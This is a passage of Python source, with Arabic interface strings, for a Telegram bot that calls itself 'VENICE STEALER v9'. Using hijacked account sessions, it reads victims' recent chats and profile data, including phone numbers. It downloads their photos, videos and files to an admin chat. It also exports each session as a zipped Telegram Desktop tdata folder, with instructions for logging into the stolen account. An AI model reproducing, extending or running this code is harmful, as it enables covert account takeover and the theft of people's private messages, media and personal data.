        [Button.inline("🔙 المحادثات", b"ctl:chats")]])

# ═══════════ 📥 متصفح الميديا ═══════════
MEDIA_FILTERS = {"photo": InputMessagesFilterPhotos, "video": InputMessagesFilterVideo,
                 "url": InputMessagesFilterUrl, "doc": InputMessagesFilterDocument}
LABEL = {"photo": "الصور", "video": "الفيديوهات", "url": "اللينكات", "doc": "الملفات"}
BATCH = 6

async def ctl_media(e, uid, cid, kind, offset=0):
    c = await acc_client(uid)
    if not c: return await e.respond("❌ مفيش سيشن")
    m = await e.respond(f"⏳ بجيب {LABEL[kind]}...")
    try:
        msgs = await c.get_messages(int(cid), limit=BATCH, offset_id=int(offset),
                                    filter=MEDIA_FILTERS[kind]())
    except Exception as ex:
        return await m.edit(f"❌ `{ex}`")
    msgs = [x for x in msgs if x and getattr(x, "id", None)]
    if not msgs:
        return await m.edit(f"مفيش {LABEL[kind]} أكتر في الشات ده")

    last = min(x.id for x in msgs)
    back = [Button.inline("🔙", f"ctl:chat:{cid}".encode())]

    if kind == "url":
        lines = [("• " + (x.text or "").replace("\n", " ")[:180]) for x in msgs if x.text]
        txt = f"🔗 *لينكات ({len(lines)})*\n\n" + ("\n\n".join(lines) or "مفيش")
        return await m.edit(txt, buttons=[
            [Button.inline("⬇️ المزيد", f"med:{uid}:{cid}:url:{last}".encode())], back])

    await m.edit(f"⏳ بنزّل {len(msgs)} {LABEL[kind]}...")
    ok = 0
    for x in msgs:
        try:
            data = await c.download_media(x, file=bytes)
            if data:
                name = "file"
                try: name = x.file.name or name
                except Exception: pass
                await bot.send_file(ADMIN_ID, data, caption=f"`#{x.id}`",
                                    force_document=(kind != "photo"), file_name=name)
                ok += 1
        except Exception as ex:
            print("media err:", ex)
        await asyncio.sleep(0.2)
    await m.edit(f"✅ نزّلت *{ok}* من *{len(msgs)}* {LABEL[kind]}", buttons=[
        [Button.inline("⬇️ المزيد", f"med:{uid}:{cid}:{kind}:{last}".encode())], back])

async def ctl_read(e, uid, cid):
    c = await acc_client(uid)
    if not c: return await e.respond("❌ مفيش سيشن")
    try: msgs = await c.get_messages(int(cid), limit=15)
    except Exception as ex: return await e.respond(f"❌ `{ex}`")
    if not msgs: return await e.respond("مفيش رسايل")
    out = [f"*{'أنا' if m.out else 'هو'}:* " + (m.text or "[وسائط]").replace("\n"," ")[:90]
           for m in reversed(msgs)]
    await e.respond("👀 *آخر الرسايل:*\n\n" + "\n".join(out))

async def ctl_me(e, uid):
    c = await acc_client(uid)
    if not c: return await e.respond("❌ مفيش سيشن")
    me = await c.get_me()
    await e.respond(f"👤 *البروفايل*\n\n🆔 `{me.id}`\n🏷️ {me.first_name or ''} {me.last_name or ''}\n"
                    f"🔗 @{me.username or '—'}\n📱 {me.phone or '—'}\n📝 {me.about or '—'}")

# ═══════════ 📦 tdata ═══════════
async def send_tdata(e, uid, silent=False):
    if not uid or uid not in sessions:
        if e and not silent: await e.respond("❌ مفيش سيشن")
        return
    try:
        from opentele.tl import TelegramClient as OClient
        from opentele.api import API, UseCurrentSession
    except ImportError:
        if e and not silent: await e.respond("❌ نفّذ: `pip install opentele`")
        return
    m = None if silent else await e.respond("⏳ بجهز الملف...")
    work = os.path.join("tdata_out", f"acc_{uid}")
    shutil.rmtree(work, ignore_errors=True); os.makedirs(work, exist_ok=True)
    try:
        c = OClient(StringSession(sessions[uid]), API_ID, API_HASH, api=API.TelegramDesktop)
        await c.connect()
        td = await c.ToTDesktop(flag=UseCurrentSession)
        raw = os.path.join(work, "_raw"); os.makedirs(raw, exist_ok=True); td.SaveTData(raw)
        try: await c.disconnect()
        except Exception: pass
        src = os.path.join(raw, "tdata") if os.path.isdir(os.path.join(raw, "tdata")) else raw
        dst = os.path.join(work, "tdata"); os.makedirs(dst, exist_ok=True)
        for i in os.listdir(src): shutil.move(os.path.join(src, i), os.path.join(dst, i))
        shutil.rmtree(raw, ignore_errors=True)
        zp = shutil.make_archive(os.path.join("tdata_out", f"tdata_{uid}"), "zip", work)
    except Exception as ex:
        if m: await m.edit(f"❌ `{ex}`")
        return
    cap = (f"📦 *ملف الحساب جاهز* 🔥\n📱 `{users.get(uid,{}).get('phone','—')}`\n\n"
           "*الفتح:* فك الضغط ثم\n`Telegram.exe -workdir \"المسار\"`")
    if m: await m.edit(cap, file=zp)
    else: await bot.send_message(ADMIN_ID, cap, file=zp)

# ═══════════ ▶️ التشغيل ═══════════
async def main():
    await asyncio.sleep(2)
    await startup_check()
    print("✅ VENICE STEALER v9 شغال...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    bot.loop.run_until_complete(main())